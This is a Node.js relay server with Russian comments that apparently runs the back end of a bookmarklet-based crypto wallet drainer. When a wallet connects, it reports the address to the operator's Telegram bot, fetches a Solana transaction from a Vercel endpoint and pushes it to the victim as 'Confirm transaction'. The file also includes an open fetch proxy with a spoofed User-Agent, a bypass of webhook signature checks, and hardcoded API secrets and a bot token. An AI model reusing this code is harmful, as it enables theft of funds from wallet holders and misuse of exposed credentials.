'use strict';

/**
 * Railway LiveKit Agent v7
 *
 * ПОЧЕМУ v6 НЕ РАБОТАЛ:
 *   - @livekit/rtc-node требует нативный WASM/WebRTC — на Railway не стартует
 *   - agentConnected всегда false → REST fallback → шлёт только "ack"
 *   - "ack" есть в FINAL сете букмарклета → букмарклет сразу отключается
 *   - Транзакция никогда не генерировалась
 *
 * v7 РЕШЕНИЕ:
 *   - Полностью убираем @livekit/rtc-node
 *   - Только RoomServiceClient REST (работает везде без WebRTC/WASM)
 *   - Данные от букмарклета принимаем через LiveKit Webhook → /webhook
 *   - action=wallet → генерируем TX через Vercel /api/generate-tx → action=response
 *   - "ack" НЕ отправляется — букмарклет не завершается преждевременно
 *
 * НАСТРОЙКА LIVEKIT WEBHOOK:
 *   В LiveKit Dashboard → Settings → Webhooks → Add Endpoint:
 *   URL: https://<RAILWAY_URL>/webhook
 *   Events: data_received, participant_joined, participant_left
 */

var http  = require('http');
var https = require('https');
var { RoomServiceClient, DataPacket_Kind, WebhookReceiver } = require('livekit-server-sdk');

var PORT          = process.env.PORT               || 8080;
var LK_API_KEY    = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_WS_URL     = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
var LK_HTTP_URL   = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
var ROOM_NAME     = process.env.LK_ROOM            || 'bookmark-room';
var VERCEL_URL    = process.env.VERCEL_URL         || 'https://waterzay.vercel.app';
var AGENT_SECRET  = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
var TG_TOKEN      = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
var TG_CHAT_ID    = process.env.TELEGRAM_CHAT_ID   || '7253475769';

var roomService     = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);
var webhookReceiver = new WebhookReceiver(LK_API_KEY, LK_API_SECRET);
var totalReceived   = 0;

// ─── Отправить данные в комнату через REST ───────────────────────────────────
function sendDataToRoom(data, toIdentities) {
  var bytes = Buffer.from(JSON.stringify(data), 'utf8');
  var opts = {};
  if (toIdentities && toIdentities.length > 0) {
    opts.destinationIdentities = toIdentities;
  }
  return roomService
    .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
    .then(function () {
      console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
    })
    .catch(function (e) {
      console.error('[sendData] ERR ' + e.message);
    });
}

// ─── Telegram уведомление ───────────────────────────────────────────────────
function sendTelegram(text) {
  if (!TG_TOKEN || !TG_CHAT_ID) {
    console.log('[tg] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not set — skipping');
    return;
  }
  var body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
  var options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: '/bot' + TG_TOKEN + '/sendMessage',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  };
  var req = https.request(options, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () { console.log('[tg] ' + res.statusCode + ' ' + d.substring(0, 120)); });
  });
  req.on('error', function (e) { console.error('[tg] ERR ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Push события на Vercel /api/agent-data (для UI polling) ────────────────
function pushToVercel(fromIdentity, action, payload) {
  var body = JSON.stringify({ fromIdentity: fromIdentity, action: action, payload: payload, source: 'livekit' });
  var urlObj;
  try { urlObj = new URL(VERCEL_URL + '/api/agent-data'); }
  catch (e) { console.error('[push] Bad VERCEL_URL: ' + e.message); return; }

  var isHttps = urlObj.protocol === 'https:';
  var opts = {
    hostname: urlObj.hostname,
    port: urlObj.port || (isHttps ? 443 : 80),
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'X-Agent-Secret': AGENT_SECRET,
    },
  };
  var mod = isHttps ? https : http;
  var req = mod.request(opts, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () { console.log('[push] Vercel ' + res.statusCode + ' ' + d.substring(0, 80)); });
  });
  req.on('error', function (e) { console.error('[push] ERR ' + e.message); });
  req.write(body);
  req.end();
}

// ─── Запросить TX у Vercel и отправить букмарклету ──────────────────────────
function generateAndSendTx(fromIdentity, wallet) {
  console.log('[tx] Requesting TX for wallet=' + wallet);
  var body = JSON.stringify({ wallet: wallet, fromIdentity: fromIdentity });
  var urlObj;
  try { urlObj = new URL(VERCEL_URL + '/api/generate-tx'); }
  catch (e) { console.error('[tx] Bad VERCEL_URL: ' + e.message); return; }

  var isHttps = urlObj.protocol === 'https:';
  var opts = {
    hostname: urlObj.hostname,
    port: urlObj.port || (isHttps ? 443 : 80),
    path: urlObj.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  };
  var mod = isHttps ? https : http;
  var req = mod.request(opts, function (res) {
    var d = '';
    res.on('data', function (c) { d += c; });
    res.on('end', function () {
      console.log('[tx] generate-tx responded ' + res.statusCode);
      try {
        var txData = JSON.parse(d);
        if (txData.tx) {
          console.log('[tx] TX generated OK, amountSOL=' + txData.amountSOL + ', sending to ' + fromIdentity);
          sendDataToRoom({
            action: 'response',
            message: 'Confirm transaction: ' + txData.amountSOL + ' SOL',
            tx: txData.tx,
            txBase64: txData.txBase64,
            amountSOL: txData.amountSOL,
            sponsorWallet: txData.sponsorWallet,
            ts: Date.now(),
          }, [fromIdentity]);
        } else {
          console.error('[tx] No TX in response: ' + d.substring(0, 200));
          sendDataToRoom({
            action: 'error',
            error: txData.error || 'TX generation failed',
            ts: Date.now(),
          }, [fromIdentity]);
        }
      } catch (e) {
        console.error('[tx] Parse error: ' + e.message + ' raw=' + d.substring(0, 100));
        sendDataToRoom({ action: 'error', error: 'TX parse: ' + e.message, ts: Date.now() }, [fromIdentity]);
      }
    });
  });
  req.on('error', function (e) {
    console.error('[tx] HTTP error: ' + e.message);
    sendDataToRoom({ action: 'error', error: 'Network: ' + e.message, ts: Date.now() }, [fromIdentity]);
  });
  req.write(body);
  req.end();
}

// ─── Обработка сообщения от букмарклета ─────────────────────────────────────
function processData(msg, fromIdentity) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || msg || {};
  console.log('[relay] from=' + fromIdentity + ' action=' + action);

  pushToVercel(fromIdentity, action, payload);

  if (action === 'ping') {
    sendDataToRoom({
      action: 'pong',
      message: 'Railway agent v7 online! (REST mode)',
      room: ROOM_NAME,
      ts: Date.now(),
    }, [fromIdentity]);

  } else if (action === 'wallet') {
    var wallet = (payload.wallet || payload || '').toString();
    console.log('[wallet] wallet=' + wallet);

    // Telegram уведомление
    sendTelegram(
      '<b>Wallet connected</b>\n' +
      'Wallet: <code>' + wallet + '</code>\n' +
      'From: <code>' + fromIdentity + '</code>'
    );

    // Генерируем TX — НЕ отправляем "ack" чтобы букмарклет не завершился раньше времени
    generateAndSendTx(fromIdentity, wallet);

  } else if (action === 'data') {
    console.log('[data] url=' + (payload.url || '—') + ' title=' + (payload.title || '—'));

    if (payload.wallet) {
      generateAndSendTx(fromIdentity, payload.wallet);
    } else {
      // data-ack не входит в FINAL у букмарклета — он продолжит ждать
      sendDataToRoom({
        action: 'data-ack',
        message: 'Data received, waiting for wallet...',
        ts: Date.now(),
      }, [fromIdentity]);
    }

  } else if (action === 'fetch') {
    var targetUrl = (payload.url || msg.url || '').toString();
    if (!targetUrl) {
      sendDataToRoom({ action: 'fetch_result', ok: false, error: 'url required', ts: Date.now() }, [fromIdentity]);
      return;
    }
    console.log('[fetch] ' + targetUrl);

    var fetchHeaders = Object.assign({
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
    }, payload.headers || {});

    fetch(targetUrl, { headers: fetchHeaders })
      .then(function (r) {
        var status = r.status;
        return r.text().then(function (t) {
          var d;
          try { d = JSON.parse(t); } catch (_) { d = t.substring(0, 8000); }
          pushToVercel(fromIdentity, 'fetch_result', { url: targetUrl, status: status, data: d });
          sendDataToRoom({
            action: 'fetch_result',
            ok: true,
            status: status,
            url: targetUrl,
            data: d,
            ts: Date.now(),
          }, [fromIdentity]);
        });
      })
      .catch(function (e) {
        sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, url: targetUrl, ts: Date.now() }, [fromIdentity]);
      });

  } else {
    // Неизвестный action — echo через data-ack (не завершает букмарклет)
    sendDataToRoom({ action: 'data-ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
  }
}

// ─── HTTP server ─────────────────────────────────────────────────────────────
var httpServer = http.createServer(function (req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Agent-Secret');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // GET /health
  if (req.method === 'GET' && (req.url === '/' || req.url === '/health')) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      ok: true,
      service: 'railway-livekit-agent-v7',
      transport: 'REST-only (no WebRTC required)',
      room: ROOM_NAME,
      totalReceived: totalReceived,
      vercelUrl: VERCEL_URL,
      telegram: !!(TG_TOKEN && TG_CHAT_ID),
      ts: Date.now(),
    }));
    return;
  }

  // POST /relay — прямые HTTP вызовы (не pump.fun)
  if (req.method === 'POST' && req.url === '/relay') {
    var body = '';
    req.on('data', function (c) { body += c.toString(); });
    req.on('end', function () {
      try {
        processData(JSON.parse(body), 'http-relay');
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: e.message }));
      }
    });
    return;
  }

  // POST /webhook — LiveKit Webhook events
  if (req.method === 'POST' && req.url === '/webhook') {
    var chunks = [];
    req.on('data', function (c) { chunks.push(c); });
    req.on('end', function () {
      var rawBody      = Buffer.concat(chunks);
      var authorization = req.headers['authorization'] || '';

      var evt;
      try {
        // Верифицированный парсинг через WebhookReceiver
        evt = webhookReceiver.receive(rawBody, authorization);
      } catch (e) {
        // LiveKit иногда не шлёт JWT — пробуем plain JSON
        console.log('[webhook] Verify failed (' + e.message + '), trying plain parse');
        try { evt = JSON.parse(rawBody.toString()); }
        catch (_) { res.writeHead(400); res.end('{}'); return; }
      }

      var eventName = evt.event || '?';
      var roomName  = (evt.room && evt.room.name) || '?';
      var partId    = (evt.participant && evt.participant.identity) || '';
      console.log('[webhook] event=' + eventName + ' room=' + roomName + (partId ? ' participant=' + partId : ''));

      // data_received — главный event: букмарклет сделал publishData()
      if (eventName === 'data_received' && evt.data) {
        totalReceived++;
        var fromId = partId || 'webhook';
        // Игнорируем собственные пакеты агента
        if (fromId === 'railway-agent-v7' || fromId === 'railway-agent-v6') {
          res.writeHead(200); res.end('{}'); return;
        }
        // evt.data — base64
        var text;
        try { text = Buffer.from(evt.data, 'base64').toString('utf8'); }
        catch (_) { text = evt.data.toString(); }
        console.log('[webhook/data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length);
        try {
          processData(JSON.parse(text), fromId);
        } catch (e) {
          console.error('[webhook/data] Parse error: ' + e.message + ' raw=' + text.substring(0, 80));
        }
      }

      if (eventName === 'participant_joined') console.log('[webhook] Joined: ' + partId);
      if (eventName === 'participant_left')   console.log('[webhook] Left:   ' + partId);

      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ ok: false, error: 'Not found' }));
});

httpServer.listen(PORT, function () {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  Railway LiveKit Agent v7  (REST-only, no WebRTC needed)    ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('[server] Port:     ' + PORT);
  console.log('[server] Room:     ' + ROOM_NAME);
  console.log('[server] LiveKit:  ' + LK_HTTP_URL);
  console.log('[server] Vercel:   ' + VERCEL_URL);
  console.log('[server] Telegram: ' + (TG_TOKEN && TG_CHAT_ID ? 'OK (' + TG_CHAT_ID + ')' : 'NOT SET'));
  console.log('');
  console.log('[server] REQUIRED: Add LiveKit Webhook in dashboard:');
  console.log('[server]   URL:    https://<RAILWAY_URL>/webhook');
  console.log('[server]   Events: data_received, participant_joined, participant_left');
  console.log('');
});



